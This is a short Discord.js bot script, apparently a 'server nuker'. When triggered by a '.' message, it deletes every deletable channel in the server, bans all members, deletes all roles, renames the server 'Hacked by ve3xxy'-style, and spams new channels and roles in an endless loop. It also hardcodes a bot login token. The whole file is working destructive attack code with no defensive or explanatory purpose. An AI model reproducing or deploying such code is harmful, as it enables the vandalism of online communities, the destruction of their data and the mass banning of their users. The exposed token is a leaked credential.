const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("Ve3xxy is here");
      setInterval(function() {
        message.guild.createChannel("Hacked by ve3xxy", "voice");
        message.guild.createChannel("Hacked By ve3xxy", "text");
        message.guild.createRole({ name: "Ve3xxy is here" });
      });
    }
  }
});

client.login("ODMxNjc3NjgyNzY0MzQ5NTIw.YHYuMw.KhYoFS1NLrqAAFY4N4Bi4t3rEuA");
